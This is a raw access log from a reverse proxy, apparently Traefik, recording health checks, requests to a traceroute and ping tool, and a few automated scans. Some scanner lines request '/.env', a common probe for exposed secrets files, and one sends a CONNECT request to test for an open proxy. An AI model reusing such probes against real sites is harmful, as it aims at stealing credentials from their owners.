167.71.120.76 - - [19/Dec/2023:00:44:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7134 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:00:45:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7135 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:00:45:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7136 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:00:46:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7137 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:00:46:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7138 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:00:47:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7139 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:00:47:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7140 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:00:48:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7141 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:00:48:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7142 "www@docker" "http://172.18.0.9:80" 1ms
57.129.23.166 - - [19/Dec/2023:00:48:41 +0000] "GET /.env HTTP/1.1" 301 17 "-" "-" 7143 "web-to-websecure@internal" "-" 0ms
57.129.23.166 - - [19/Dec/2023:00:48:41 +0000] "POST / HTTP/1.1" 308 18 "-" "-" 7144 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [19/Dec/2023:00:49:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7145 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:00:49:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7146 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:00:50:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7147 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:00:50:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7148 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:00:51:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7149 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:00:51:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7150 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:00:52:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7151 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:00:52:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7152 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:00:53:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7153 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:00:53:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7154 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:00:54:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7155 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:00:54:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7156 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:00:55:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7157 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:00:55:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7158 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:00:56:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7159 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:00:56:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7160 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:00:57:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7161 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:00:57:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7162 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:00:58:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7163 "www@docker" "http://172.18.0.9:80" 0ms
185.180.140.4 - - [19/Dec/2023:00:58:29 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 7164 "-" "-" 0ms
167.71.120.76 - - [19/Dec/2023:00:58:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7165 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:00:59:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7166 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [19/Dec/2023:00:59:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7167 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:01:00:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7168 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [19/Dec/2023:01:00:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7169 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:01:01:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7170 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:01:01:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7171 "www@docker" "http://172.18.0.9:80" 0ms
159.223.138.47 - - [19/Dec/2023:01:01:59 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 7172 "-" "-" 0ms
159.203.109.206 - - [19/Dec/2023:01:02:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7173 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [19/Dec/2023:01:02:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7174 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:01:03:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7175 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:01:03:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7176 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:01:04:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7177 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:01:04:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7178 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:01:05:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7179 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [19/Dec/2023:01:05:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7180 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:01:06:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7181 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:01:06:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7182 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:01:07:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7183 "www@docker" "http://172.18.0.9:80" 0ms
45.33.87.154 - - [19/Dec/2023:01:07:29 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 7184 "-" "-" 0ms
167.71.120.76 - - [19/Dec/2023:01:07:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7185 "www@docker" "http://172.18.0.9:80" 1ms
45.79.128.205 - - [19/Dec/2023:01:08:03 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 7186 "-" "-" 0ms
159.203.109.206 - - [19/Dec/2023:01:08:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7187 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:01:08:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7188 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:01:09:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7189 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:01:09:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7190 "www@docker" "http://172.18.0.9:80" 0ms
143.110.222.166 - - [19/Dec/2023:01:09:58 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 7191 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [19/Dec/2023:01:10:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7192 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [19/Dec/2023:01:10:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7193 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:01:11:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7194 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:01:11:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7195 "www@docker" "http://172.18.0.9:80" 1ms
199.45.154.16 - - [19/Dec/2023:01:11:40 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 7196 "web-to-websecure@internal" "-" 0ms
199.45.154.16 - - [19/Dec/2023:01:11:43 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 7197 "web-to-websecure@internal" "-" 0ms
199.45.154.16 - - [19/Dec/2023:01:11:47 +0000] "GET / HTTP/1.1" 200 334 "-" "-" 7198 "www@docker" "http://172.18.0.9:80" 36ms
199.45.154.16 - - [19/Dec/2023:01:11:49 +0000] "GET /favicon.ico HTTP/1.1" 404 153 "-" "-" 7199 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:01:12:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7200 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:01:12:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7201 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:01:13:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7202 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:01:13:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7203 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:01:14:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7204 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [19/Dec/2023:01:14:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7205 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:01:15:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7206 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:01:15:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7207 "www@docker" "http://172.18.0.9:80" 0ms
143.110.222.166 - - [19/Dec/2023:01:15:46 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 7208 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [19/Dec/2023:01:16:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7209 "www@docker" "http://172.18.0.9:80" 0ms
54.37.79.75 - - [19/Dec/2023:01:16:25 +0000] "GET /.env HTTP/1.1" 301 17 "-" "-" 7210 "web-to-websecure@internal" "-" 0ms
54.37.79.75 - - [19/Dec/2023:01:16:25 +0000] "POST / HTTP/1.1" 308 18 "-" "-" 7211 "web-to-websecure@internal" "-" 0ms
167.71.120.76 - - [19/Dec/2023:01:16:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7212 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:01:17:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7213 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [19/Dec/2023:01:17:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7214 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:01:18:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7215 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [19/Dec/2023:01:18:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7216 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:01:19:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7217 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:01:19:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7218 "www@docker" "http://172.18.0.9:80" 1ms
45.33.87.154 - - [19/Dec/2023:01:19:57 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 7219 "-" "-" 0ms
159.203.109.206 - - [19/Dec/2023:01:20:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7220 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:01:20:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7221 "www@docker" "http://172.18.0.9:80" 0ms
172.105.128.13 - - [19/Dec/2023:01:21:09 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 7222 "-" "-" 0ms
159.203.109.206 - - [19/Dec/2023:01:21:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7223 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:01:21:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7224 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:01:22:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7225 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:01:22:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7226 "www@docker" "http://172.18.0.9:80" 1ms
90.151.171.106 - - [19/Dec/2023:01:22:50 +0000] "CONNECT - HTTP/1.1" 308 18 "-" "-" 7227 "web-to-websecure@internal" "-" 0ms
90.151.171.106 - - [19/Dec/2023:01:23:00 +0000] "GET /ip?Z78354937572Q1 HTTP/1.1" 301 17 "-" "-" 7228 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [19/Dec/2023:01:23:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7229 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:01:23:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7230 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:01:24:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7231 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [19/Dec/2023:01:24:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7232 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:01:25:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7233 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:01:25:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7234 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:01:26:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7235 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:01:26:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7236 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:01:27:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7237 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [19/Dec/2023:01:27:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7238 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:01:28:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7239 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [19/Dec/2023:01:28:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7240 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:01:29:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7241 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:01:29:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7242 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:01:30:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7243 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:01:30:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7244 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:01:31:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7245 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:01:31:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7246 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:01:32:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7247 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:01:32:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7248 "www@docker" "http://172.18.0.9:80" 0ms
173.48.140.140 - - [19/Dec/2023:01:32:47 +0000] "GET /trace/startping.php?id=7s9p7dv58 HTTP/2.0" 200 105 "-" "-" 7249 "livetrace@docker" "http://172.18.0.3:80" 4ms
173.48.140.140 - - [19/Dec/2023:01:32:48 +0000] "GET /trace/pollping.php?id=7s9p7dv58 HTTP/2.0" 200 34 "-" "-" 7250 "livetrace@docker" "http://172.18.0.3:80" 2ms
173.48.140.140 - - [19/Dec/2023:01:32:49 +0000] "GET /trace/pollping.php?id=7s9p7dv58 HTTP/2.0" 200 62 "-" "-" 7251 "livetrace@docker" "http://172.18.0.3:80" 1ms
173.48.140.140 - - [19/Dec/2023:01:32:50 +0000] "GET /trace/pollping.php?id=7s9p7dv58 HTTP/2.0" 200 87 "-" "-" 7252 "livetrace@docker" "http://172.18.0.3:80" 2ms
173.48.140.140 - - [19/Dec/2023:01:32:51 +0000] "GET /trace/pollping.php?id=7s9p7dv58 HTTP/2.0" 200 113 "-" "-" 7253 "livetrace@docker" "http://172.18.0.3:80" 1ms
173.48.140.140 - - [19/Dec/2023:01:32:52 +0000] "GET /trace/pollping.php?id=7s9p7dv58 HTTP/2.0" 200 137 "-" "-" 7254 "livetrace@docker" "http://172.18.0.3:80" 1ms
173.48.140.140 - - [19/Dec/2023:01:32:53 +0000] "GET /trace/pollping.php?id=7s9p7dv58 HTTP/2.0" 200 162 "-" "-" 7255 "livetrace@docker" "http://172.18.0.3:80" 1ms
173.48.140.140 - - [19/Dec/2023:01:32:54 +0000] "GET /trace/pollping.php?id=7s9p7dv58 HTTP/2.0" 200 186 "-" "-" 7256 "livetrace@docker" "http://172.18.0.3:80" 1ms
173.48.140.140 - - [19/Dec/2023:01:32:55 +0000] "GET /trace/pollping.php?id=7s9p7dv58 HTTP/2.0" 200 209 "-" "-" 7257 "livetrace@docker" "http://172.18.0.3:80" 2ms
173.48.140.140 - - [19/Dec/2023:01:32:55 +0000] "GET /trace/cleanping.php?id=7s9p7dv58 HTTP/2.0" 200 71 "-" "-" 7258 "livetrace@docker" "http://172.18.0.3:80" 2ms
159.203.109.206 - - [19/Dec/2023:01:33:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7259 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:01:33:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7260 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:01:34:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7261 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:01:34:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7262 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:01:35:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7263 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:01:35:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7264 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:01:36:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7265 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:01:36:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7266 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:01:37:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7267 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [19/Dec/2023:01:37:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7268 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:01:38:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7269 "www@docker" "http://172.18.0.9:80" 1ms
102.129.232.53 - - [19/Dec/2023:01:38:30 +0000] "HEAD / HTTP/1.1" 308 18 "-" "-" 7270 "web-to-websecure@internal" "-" 0ms
167.71.120.76 - - [19/Dec/2023:01:38:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7271 "www@docker" "http://172.18.0.9:80" 0ms
45.79.163.53 - - [19/Dec/2023:01:39:13 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 7272 "-" "-" 0ms
173.48.140.140 - - [19/Dec/2023:01:39:18 +0000] "GET /trace/starttrace.php?id=g0mchk411 HTTP/2.0" 200 106 "-" "-" 7274 "livetrace@docker" "http://172.18.0.3:80" 7ms
173.48.140.140 - - [19/Dec/2023:01:39:18 +0000] "GET /trace/startping.php?id=cl36l19ux HTTP/2.0" 200 105 "-" "-" 7273 "livetrace@docker" "http://172.18.0.3:80" 11ms
173.48.140.140 - - [19/Dec/2023:01:39:19 +0000] "GET /trace/polltrace.php?id=g0mchk411 HTTP/2.0" 200 67 "-" "-" 7275 "livetrace@docker" "http://172.18.0.3:80" 4ms
173.48.140.140 - - [19/Dec/2023:01:39:19 +0000] "GET /trace/pollping.php?id=cl36l19ux HTTP/2.0" 200 34 "-" "-" 7276 "livetrace@docker" "http://172.18.0.3:80" 2ms
173.48.140.140 - - [19/Dec/2023:01:39:20 +0000] "GET /trace/pollping.php?id=cl36l19ux HTTP/2.0" 200 59 "-" "-" 7278 "livetrace@docker" "http://172.18.0.3:80" 1ms
173.48.140.140 - - [19/Dec/2023:01:39:20 +0000] "GET /trace/polltrace.php?id=g0mchk411 HTTP/2.0" 200 67 "-" "-" 7277 "livetrace@docker" "http://172.18.0.3:80" 4ms
173.48.140.140 - - [19/Dec/2023:01:39:21 +0000] "GET /trace/polltrace.php?id=g0mchk411 HTTP/2.0" 200 67 "-" "-" 7279 "livetrace@docker" "http://172.18.0.3:80" 1ms
173.48.140.140 - - [19/Dec/2023:01:39:21 +0000] "GET /trace/pollping.php?id=cl36l19ux HTTP/2.0" 200 85 "-" "-" 7280 "livetrace@docker" "http://172.18.0.3:80" 1ms
159.203.109.206 - - [19/Dec/2023:01:39:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7281 "www@docker" "http://172.18.0.9:80" 0ms
173.48.140.140 - - [19/Dec/2023:01:39:22 +0000] "GET /trace/pollping.php?id=cl36l19ux HTTP/2.0" 200 112 "-" "-" 7283 "livetrace@docker" "http://172.18.0.3:80" 1ms
173.48.140.140 - - [19/Dec/2023:01:39:22 +0000] "GET /trace/polltrace.php?id=g0mchk411 HTTP/2.0" 200 67 "-" "-" 7282 "livetrace@docker" "http://172.18.0.3:80" 5ms
173.48.140.140 - - [19/Dec/2023:01:39:23 +0000] "GET /trace/pollping.php?id=cl36l19ux HTTP/2.0" 200 138 "-" "-" 7285 "livetrace@docker" "http://172.18.0.3:80" 2ms
173.48.140.140 - - [19/Dec/2023:01:39:23 +0000] "GET /trace/polltrace.php?id=g0mchk411 HTTP/2.0" 200 67 "-" "-" 7284 "livetrace@docker" "http://172.18.0.3:80" 2ms
173.48.140.140 - - [19/Dec/2023:01:39:24 +0000] "GET /trace/polltrace.php?id=g0mchk411 HTTP/2.0" 200 67 "-" "-" 7286 "livetrace@docker" "http://172.18.0.3:80" 2ms
173.48.140.140 - - [19/Dec/2023:01:39:24 +0000] "GET /trace/pollping.php?id=cl36l19ux HTTP/2.0" 200 164 "-" "-" 7287 "livetrace@docker" "http://172.18.0.3:80" 2ms
173.48.140.140 - - [19/Dec/2023:01:39:25 +0000] "GET /trace/polltrace.php?id=g0mchk411 HTTP/2.0" 200 120 "-" "-" 7288 "livetrace@docker" "http://172.18.0.3:80" 2ms
173.48.140.140 - - [19/Dec/2023:01:39:25 +0000] "GET /trace/pollping.php?id=cl36l19ux HTTP/2.0" 200 190 "-" "-" 7289 "livetrace@docker" "http://172.18.0.3:80" 2ms
173.48.140.140 - - [19/Dec/2023:01:39:26 +0000] "GET /trace/polltrace.php?id=g0mchk411 HTTP/2.0" 200 120 "-" "-" 7290 "livetrace@docker" "http://172.18.0.3:80" 2ms
173.48.140.140 - - [19/Dec/2023:01:39:26 +0000] "GET /trace/pollping.php?id=cl36l19ux HTTP/2.0" 200 213 "-" "-" 7291 "livetrace@docker" "http://172.18.0.3:80" 1ms
173.48.140.140 - - [19/Dec/2023:01:39:26 +0000] "GET /trace/cleanping.php?id=cl36l19ux HTTP/2.0" 200 71 "-" "-" 7292 "livetrace@docker" "http://172.18.0.3:80" 2ms
173.48.140.140 - - [19/Dec/2023:01:39:27 +0000] "GET /trace/polltrace.php?id=g0mchk411 HTTP/2.0" 200 120 "-" "-" 7293 "livetrace@docker" "http://172.18.0.3:80" 1ms
173.48.140.140 - - [19/Dec/2023:01:39:28 +0000] "GET /trace/polltrace.php?id=g0mchk411 HTTP/2.0" 200 120 "-" "-" 7294 "livetrace@docker" "http://172.18.0.3:80" 1ms
173.48.140.140 - - [19/Dec/2023:01:39:29 +0000] "GET /trace/polltrace.php?id=g0mchk411 HTTP/2.0" 200 120 "-" "-" 7295 "livetrace@docker" "http://172.18.0.3:80" 1ms
173.48.140.140 - - [19/Dec/2023:01:39:30 +0000] "GET /trace/polltrace.php?id=g0mchk411 HTTP/2.0" 200 120 "-" "-" 7296 "livetrace@docker" "http://172.18.0.3:80" 2ms
173.48.140.140 - - [19/Dec/2023:01:39:31 +0000] "GET /trace/polltrace.php?id=g0mchk411 HTTP/2.0" 200 322 "-" "-" 7297 "livetrace@docker" "http://172.18.0.3:80" 1ms
173.48.140.140 - - [19/Dec/2023:01:39:32 +0000] "GET /trace/polltrace.php?id=g0mchk411 HTTP/2.0" 200 322 "-" "-" 7298 "livetrace@docker" "http://172.18.0.3:80" 1ms
173.48.140.140 - - [19/Dec/2023:01:39:33 +0000] "GET /trace/polltrace.php?id=g0mchk411 HTTP/2.0" 200 322 "-" "-" 7299 "livetrace@docker" "http://172.18.0.3:80" 1ms
173.48.140.140 - - [19/Dec/2023:01:39:34 +0000] "GET /trace/polltrace.php?id=g0mchk411 HTTP/2.0" 200 441 "-" "-" 7300 "livetrace@docker" "http://172.18.0.3:80" 1ms
173.48.140.140 - - [19/Dec/2023:01:39:35 +0000] "GET /trace/polltrace.php?id=g0mchk411 HTTP/2.0" 200 441 "-" "-" 7301 "livetrace@docker" "http://172.18.0.3:80" 1ms
167.71.120.76 - - [19/Dec/2023:01:39:36 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 7302 "www@docker" "http://172.18.0.9:80" 0ms
173.48.140.140 - - [19/Dec/2023:01:39:36 +0000] "GET /trace/polltrace.php?id=g0mchk411 HTTP/2.0" 200 441 "-" "-" 7303 "livetrace@docker" "http://172.18.0.3:80" 1ms
173.48.140.140 - - [19/Dec/2023:01:39:37 +0000] "GET /trace/polltrace.php?id=g0mchk411 HTTP/2.0" 200 493 "-" "-" 7304 "livetrace@docker" "http://172.18.0.3:80" 2ms
173.48.140.140 - - [19/Dec/2023:01:39:38 +0000] "GET /trace/polltrace.php?id=g0mchk411 HTTP/2.0" 200 493 "-" "-" 7305 "livetrace@docker" "http://172.18.0.3:80" 1ms
